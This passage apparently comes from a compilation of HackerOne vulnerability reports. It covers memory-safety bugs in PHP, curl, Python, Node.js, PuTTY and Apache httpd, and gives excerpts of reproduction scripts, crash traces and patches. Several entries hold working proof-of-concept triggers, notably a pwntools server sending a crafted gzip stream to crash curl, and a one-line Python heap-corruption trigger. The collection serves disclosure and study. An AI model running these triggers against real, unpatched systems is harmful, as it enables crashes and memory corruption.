         * A non-secure cookie may not overlay an existing secure cookie.
         * For an existing cookie "a" with path "/login", refuse a new
         * cookie "a" with for example path "/login/en", while the path
# … truncated …
```

## 123. [#746766](https://hackerone.com/reports/746766)  -  Two out-of-bounds array reads in Python AST builder (Re-opening 520612 with CVEs)
*medium, $2,000*

```http
Getting CVEs issued took a while, but here they are:

- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19274
```

## 124. [#248601](https://hackerone.com/reports/248601)  -  PHP INI Parsing Stack Buffer Overflow Vulnerability
*medium, $500*

```bash
$ cat input.ini
0=0&~2000000000

$ cat input.php
<?php 

$argc = $_SERVER['argc'];
$argv = $_SERVER['argv'];

$file_loc = dirname(__FILE__)."/".$argv[1];

var_dump(parse_ini_file($file_loc, true, INI_SCANNER_NORMAL));

?>
```

## 125. [#248659](https://hackerone.com/reports/248659)  -  PHP WDDX Deserialization Heap OOB Read in timelib_meridian()
*medium, $500*

```bash
$ cat wddx.php 
<?php
$argc = $_SERVER['argc'];
$argv = $_SERVER['argv'];

$dir_str = dirname(__FILE__);
$file_str = ($dir_str)."/".$argv[1];

if (!extension_loaded('wddx')) print "wddx not loaded.\n";

$wddx_str = file_get_contents($file_str);
print strlen($wddx_str) . " bytes read.\n";
var_dump(wddx_deserialize($wddx_str));
?>
```

## 126. [#320222](https://hackerone.com/reports/320222)  -  memory corruption while parsing HTTP response
*medium, $500*

```
php_stream_url_wrap_http_ex /home/weilei/php-7.2.2/ext/standard/http_fopen_wrapper.c:723

			if (tmp_line[tmp_line_len - 1] == '\n') {
				--tmp_line_len;
				if (tmp_line[tmp_line_len - 1] == '\r') {
					--tmp_line_len;
				}
```

## 127. [#3620748](https://hackerone.com/reports/3620748)  -  V1Plugin.Decrypt panics on empty ciphertext (Remote DoS)
*medium*

```bash
$ go test -fuzz FuzzV1Decrypt -fuzztime 10s ./pkg/plugin/
--- FAIL: FuzzV1Decrypt (0.00s)
    --- FAIL: FuzzV1Decrypt/seed#0 (0.00s)
panic: runtime error: index out of range [0] with length 0
    sigs.k8s.io/aws-encryption-provider/pkg/plugin.(*V1Plugin).Decrypt
        ████████
```

## 128. [#3620753](https://hackerone.com/reports/3620753)  -  V2Plugin.Decrypt panics on empty ciphertext (Remote DoS)
*medium*

```bash
$ go test -fuzz FuzzV2Decrypt -fuzztime 10s ./pkg/plugin/
--- FAIL: FuzzV2Decrypt (0.00s)
    --- FAIL: FuzzV2Decrypt/seed#0 (0.00s)
panic: runtime error: index out of range [0] with length 0
    sigs.k8s.io/aws-encryption-provider/pkg/plugin.(*V2Plugin).Decrypt
        ████████
```

## 129. [#255587](https://hackerone.com/reports/255587)  -  CVE-2017-1000101: cURL: URL globbing out of bounds read
*medium*

```http
Patched: 14 June 2017
Released: 9 August 2017
Advisory: 9 August 2017

Stack:
```

## 130. [#174069](https://hackerone.com/reports/174069)  -  Buffer overflow in HTTP parse_hostinfo(), parse_userinfo() and parse_scheme()
*medium*

```php
$ cat http_message_parse.php
/*
        http_message_parse.php
        bug73185.bin
        http://hlt99.blinkenshell.org/php/bug73185.bin
*/
<?php
    $http_msg = new http\Message(file_get_contents("bug73185.bin"), false);
?>
```

## 131. [#692040](https://hackerone.com/reports/692040)  -  PHP 7.3.3: Heap-use-after-free (READ of size 8) in match_at()
*medium*

```
php -r '$file=file_get_contents("test0011"); print_r(mb_ereg($file, 0);'
```

## 132. [#988103](https://hackerone.com/reports/988103)  -  Node.js: use-after-free in TLSWrap
*high*

```
const https = require('https');

const key = `-----BEGIN EC PARAMETERS-----
BggqhkjOPQMBBw==
-----END EC PARAMETERS-----
-----BEGIN EC PRIVATE KEY-----
MHcCAQEEIDKfHHbiJMdu2STyHL11fWC7psMY19/gUNpsUpkwgGACoAoGCCqGSM49
AwEHoUQDQgAEItqm+pYj3Ca8bi5mBs+H8xSMxuW2JNn4I+kw3aREsetLk8pn3o81
PWBiTdSZrGBGQSy+UAlQvYeE6Z/QXQk8aw==
-----END EC PRIVATE KEY-----`

const cert = `-----BEGIN CERTIFICATE-----
MIIBhjCCASsCFDJU1tCo88NYU//pE+DQKO9hUDsFMAoGCCqGSM49BAMCMEUxCzAJ
BgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5l
dCBXaWRnaXRzIFB0eSBMdGQwHhcNMjAwOTIyMDg1NDU5WhcNNDgwMjA3MDg1NDU5
WjBFMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwY
SW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcD
QgAEItqm+pYj3Ca8bi5mBs+H8xSMxuW2JNn4I+kw3aREsetLk8pn3o81PWBiTdSZ
rGBGQSy+UAlQvYeE6Z/QXQk8azAKBggqhkjOPQQDAgNJADBGAiEA7Bdn4F87KqIe
Y/ABy/XIXXpFUb2nyv3zV7POQi2lPcECIQC3UWLmfiedpiIKsf9YRIyO0uEood7+
glj2R1NNr1X68w==
-----END CERTIFICATE-----`

const options = {
  key: key,
  cert: cert,
};

https.createServer(options, function (req, res) {
  res.writeHead(200);
  res.end("hello world\n");
}).listen(4444);
```

## 133. [#190933](https://hackerone.com/reports/190933)  -  Invalid parameter in memcpy function trough openssl_pbkdf2
*low, $500*

```http
Patch:  https://github.com/php/php-src/commit/493b2bff02531b0ead233177a2a0846c75e94777
```

## 134. [#175315](https://hackerone.com/reports/175315)  -  Illegal write access through Locale methods
*low, $500*

```
LD_LIBRARY_PATH=/home/operac/icu58/lib USE_ZEND_ALLOC=0 ASAN_OPTIONS=detect_leaks=0 gdb -q --args /home/operac/build4/bin/php -dextension=/home/operac/build4/lib/php/20151012-debug/intl.so -n poc.php
No symbol table is loaded.  Use the "file" command.
Breakpoint 1 (__asan_report_error) pending.
Reading symbols from /home/operac/build4/bin/php...done.
gdb-peda$ r
Starting program: /home/operac/build4/bin/php -dextension=/home/operac/build4/lib/php/20151012-debug/intl.so -n poc.php
...
Stopped reason: SIGSEGV
0x00007fffee3e8ed5 in ulocimp_getLanguage (localeID=0x7ffe6c3f8800 '#' <repeats 200 times>..., language=0x616000026798 '#' <repeats 200 times>..., languageCapacity=0x200, pEnd=0x0) at uloc.cpp:1244
1244                language[i]=(char)uprv_tolower(*localeID);
gdb-peda$ p/d i
$1 = -2147483648    // negative index
```

## 135. [#484930](https://hackerone.com/reports/484930)  -  puttygen: 160MB memory leak while trying to extract openssh public key from crafted key file
*low*

```http
puttygen does not sufficiently track and release allocated memory after it has been used, which slowly consumes remaining memory. This is often triggered by improper handling of malformed data or unexpectedly interrupted sessions. 

## Steps To Reproduce:
```

## 136. [#2956023](https://hackerone.com/reports/2956023)  -  CVE-2025-0725: gzip integer overflow
*low*

```
python3 ./server.py
```

## 137. [#172403](https://hackerone.com/reports/172403)  -  Python 2.7 32-bit JSON encoding heap corruption
*low*

```python
python -c 'import json; json.dumps({chr(0x22)*0x2AAAAAAB:0})'
```

## 138. [#3751697](https://hackerone.com/reports/3751697)  -  CVE-2026-10536: HTTP/2 stream-dependency tree UAF
*low*

```c
Curl_freeset(data);
memset(&data->set, 0, sizeof(struct UserDefined));
Curl_init_userdefined(data);
```

## 139. [#503821](https://hackerone.com/reports/503821)  -  Assertion `col >= 0 && col < line->cols' failed, process aborted while streaming ouput from remote server
*low*

```
putty: terminal.c:259: void clear_cc(termline *, int): Assertion `col >= 0 && col < line->cols' failed.
Aborted (core dumped)
```

## 140. [#503821](https://hackerone.com/reports/503821)  -  Assertion `col >= 0 && col < line->cols' failed, process aborted while streaming ouput from remote server
*low*

```http
putty: terminal.c:259: void clear_cc(termline *, int): Assertion `col >= 0 && col < line->cols' failed.
```

## 141. [#248609](https://hackerone.com/reports/248609)  -  PHP OpenSSL zif_openssl_seal() heap overflow (wild memcpy)
*medium, $500*

```
<?php 
$argc = $_SERVER['argc'];
$argv = $_SERVER['argv'];

$dir_str = dirname(__FILE__);
$file_str = ($dir_str)."/".$argv[1];
echo "Input file: ".$file_str."\n";

if(!extension_loaded('openssl')) print "openssl not loaded.\n";

$inputstr = file_get_contents($file_str);
print strlen($inputstr) . " bytes read.\n";

$pub_key_id = openssl_get_publickey($inputstr);
var_dump($pub_key_id);

openssl_seal($inputstr, $sealed, $ekeys, array($pub_key_id, $pub_key_id), 'AES-128-ECB');

var_dump($sealed);	
?>
$ uname -a
Linux CSLB16U 4.4.0-78-generic #99-Ubuntu SMP Thu Apr 27 15:29:09 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux

$ ./i686-pc-linux-gnu-php --version
PHP 7.1.5 (cli) (built: May 25 2017 16:35:37) ( NTS )
Copyright (c) 1997-2017 The PHP Group
Zend Engine v3.1.0, Copyright (c) 1998-2017 Zend Technologies

$ xxd -g 1 repro.pem 
00000000: 2d 2d 2d 2d 2d 42 45 47 49 4e 20 43 45 52 54 49  -----BEGIN CERTI
00000010: 46 49 43 41 54 45 2d 2d 2d 2d 2d 0a 4d 49 49 45  FICATE-----.MIIE
00000020: 6f 44 43 43 42 41 6d 67 41 77 49 42 41 67 49 42  oDCCBAmgAwIBAgIB
00000030: 4a 7a 41 4e 42 67 6b 71 68 6b 69 47 39 77 30 42  JzANBgkqhkiG9w0B
00000040: 41 51 51 46 41 44 43 42 6b 44 45 4c 4d 41 6b 47  AQQFADCBkDELMAkG
00000050: 41 31 55 45 46 68 4d 43 55 6b 38 78 0a 45 44 41  A1UEFhMCUk8x.EDA
# … truncated …
```

## 142. [#2956023](https://hackerone.com/reports/2956023)  -  CVE-2025-0725: gzip integer overflow
*low*

```py
#!/usr/bin/env python3

from pwn import *

gzip_header = bytes([
    0x1f, 0x8b, # magic values
    8, # method
    8, # flags
    0, 0, 0, 0, 0, 0, # random bullshit go
])

with listen(1234) as conn:
    conn.wait_for_connection()
    
    # Discard HTTP request
    while True:
        line = conn.recvline()
        
        if line == b"\r\n":
            break
    
    # Fill up buffer
    conn.sendline(b"HTTP/1.1 200 OK\r")
    conn.sendline(b"Content-Encoding: gzip\r")
    conn.sendline(b"\r")
    conn.send(gzip_header)
    
    todo = 0xFFFFFFFF - 15 - len(gzip_header)
    amnt = 6000000
    
    while todo > amnt:
        conn.send(bytes([1]) * amnt)
        todo -= amnt
        
    conn.send(bytes([1]) * todo)
    
    # Trigger integer overflow
    time.sleep(5)
    conn.send(bytes(32)) # forged chunk
```

## 143. [#1595296](https://hackerone.com/reports/1595296)  -  Read beyond bounds in mod_isapi.c [zhbug_httpd_41]
*low*

```
-------- dllmain.cpp ----------------------------------------------------
#include <windows.h>
#include <HttpExt.h>

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

BOOL WINAPI GetExtensionVersion(HSE_VERSION_INFO * pVI) {
    return TRUE;
}

DWORD WINAPI HttpExtensionProc(EXTENSION_CONTROL_BLOCK* pECB) {

    char buf[] = "";
    DWORD bufSize = sizeof(buf);

    pECB->ServerSupportFunction(
        pECB->ConnID, HSE_REQ_MAP_URL_TO_PATH, buf, &bufSize, NULL);

    return HSE_STATUS_SUCCESS;
}
-------- dllmain.cpp ----------------------------------------------------

-------- foo.def ----------------------------------------------------
LIBRARY foo
EXPORTS
    DllMain
# … truncated …
```

## 144. [#3751697](https://hackerone.com/reports/3751697)  -  CVE-2026-10536: HTTP/2 stream-dependency tree UAF
*low*

```diff
--- a/lib/url.c
+++ b/lib/url.c
@@ -120,9 +120,9 @@
 #ifdef USE_NGHTTP2
-static void data_priority_cleanup(struct Curl_easy *data);
+void Curl_data_priority_cleanup(struct Curl_easy *data);
 #else
-#define data_priority_cleanup(x)
+#define Curl_data_priority_cleanup(x)
 #endif
@@ -275,7 +275,7 @@
   /* destroy data->state.priority for HTTP/2 dep tree */
-  data_priority_cleanup(data);
+  Curl_data_priority_cleanup(data);
@@ -3087,7 +3087,7 @@
-static void data_priority_cleanup(struct Curl_easy *data)
+void Curl_data_priority_cleanup(struct Curl_easy *data)

--- a/lib/easy.c
+++ b/lib/easy.c
@@ -1093,6 +1093,7 @@ void curl_easy_reset(CURL *curl)
   /* clear all meta data */
   Curl_meta_reset(data);
+  Curl_data_priority_cleanup(data);
   /* zero out UserDefined data: */
   Curl_freeset(data);
   memset(&data->set, 0, sizeof(struct UserDefined));
```

## 145. [#180582](https://hackerone.com/reports/180582)  -  Heap overflow due to integer overflow in php_escape_html_entities_ex() function
*low*

```
If `oldlen` is equal to PHP_INT_MAX, `maxlen` will be an unexpected value and `zend_string_alloc()` function will allocate a small memory range. Due to missing check of size before calling
`zend_string_alloc()`, this new memory range can not use to store large html data and lead to heap overflow. I can overwrite other objects of PHP in memory. This bug is only triggered in 32bit machine.

Solution:
It should be `zend_string_alloc_safe` instead of `zend_string_alloc`. 

Test script:
---------------
```

## 146. [#180584](https://hackerone.com/reports/180584)  -  Heap overflow due to integer overflow in pg_escape_string() function
*low*

```
If length of `from` string is equal to PHP_INT_MAX, new string `to` will have an unexpected length. Due to missing check of size before calling
`zend_string_alloc()`, this new memory range can not use to store large data and lead to heap overflow. I can overwrite other objects of PHP in memory. This bug is only triggered in 32bit machine.

Solution:
It should be `zend_string_alloc_safe` instead of `zend_string_alloc`. 

Test script:
---------------
```
